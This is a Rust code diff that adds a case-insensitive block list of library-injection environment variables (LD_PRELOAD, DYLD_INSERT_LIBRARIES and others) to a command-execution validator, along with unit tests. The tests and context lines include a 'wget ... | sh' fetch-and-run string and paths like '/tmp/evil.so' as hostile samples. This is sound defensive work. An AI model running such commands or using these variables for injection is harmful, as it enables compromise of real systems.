@@ -169,6 +169,46 @@ pub fn check_blocklist(cmd: &str) -> Result<(), NikaError> {
     Ok(())
 }
 
+/// Blocked environment variable names (library injection / privilege escalation).
+///
+/// These variables allow injecting arbitrary shared libraries into child
+/// processes and must never be set from workflow YAML.
+const BLOCKED_ENV_VARS: &[&str] = &[
+    "LD_PRELOAD",
+    "LD_LIBRARY_PATH",
+    "DYLD_INSERT_LIBRARIES",
+    "DYLD_LIBRARY_PATH",
+    "DYLD_FRAMEWORK_PATH",
+    "LD_AUDIT",
+    "LD_PROFILE",
+];
+
+/// Validate environment variables for dangerous names.
+///
+/// Rejects env vars that enable library injection or privilege escalation.
+/// Comparison is case-insensitive.
+///
+/// # Errors
+///
+/// Returns `BlockedCommand` if a blocked env var name is found.
+pub fn validate_env_vars(vars: &[(String, String)]) -> Result<(), NikaError> {
+    for (key, _) in vars {
+        let upper = key.to_uppercase();
+        for blocked in BLOCKED_ENV_VARS {
+            if upper == *blocked {
+                return Err(NikaError::BlockedCommand {
+                    command: format!("env: {}=...", key),
+                    reason: format!(
+                        "Blocked environment variable '{}': library injection risk",
+                        key
+                    ),
+                });
+            }
+        }
+    }
+    Ok(())
+}
+
 /// Full security validation for exec commands
 ///
 /// Combines control character validation and blocklist checking.
@@ -607,6 +647,48 @@ mod tests {
         let fullwidth_pipe_sh = "wget https://bad.com ｜ sh";
         let result = check_blocklist(fullwidth_pipe_sh);
         assert!(result.is_err(), "Fullwidth pipe to sh should be blocked");
+    }
+
+    // =========================================================================
+    // Environment Variable Blocklist Tests
+    // =========================================================================
+
+    #[test]
+    fn test_validate_env_vars_blocks_ld_preload() {
+        let vars = vec![("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string())];
+        let result = validate_env_vars(&vars);
+        assert!(result.is_err(), "LD_PRELOAD should be blocked");
+        let err = result.unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+        assert!(err.to_string().contains("LD_PRELOAD"));
+    }
+
+    #[test]
+    fn test_validate_env_vars_blocks_dyld_insert() {
+        let vars = vec![(
+            "DYLD_INSERT_LIBRARIES".to_string(),
+            "/tmp/evil.dylib".to_string(),
+        )];
+        let result = validate_env_vars(&vars);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_validate_env_vars_allows_safe_vars() {
+        let vars = vec![
+            ("HOME".to_string(), "/home/user".to_string()),
+            ("NODE_ENV".to_string(), "production".to_string()),
+            ("MY_APP_KEY".to_string(), "value".to_string()),
+        ];
+        let result = validate_env_vars(&vars);
+        assert!(result.is_ok(), "safe env vars should be allowed");
+    }
+
+    #[test]
+    fn test_validate_env_vars_blocks_case_insensitive() {
+        let vars = vec![("ld_preload".to_string(), "/tmp/evil.so".to_string())];
+        let result = validate_env_vars(&vars);
+        assert!(result.is_err(), "lowercase LD_PRELOAD should be blocked");
     }
 
     #[test]
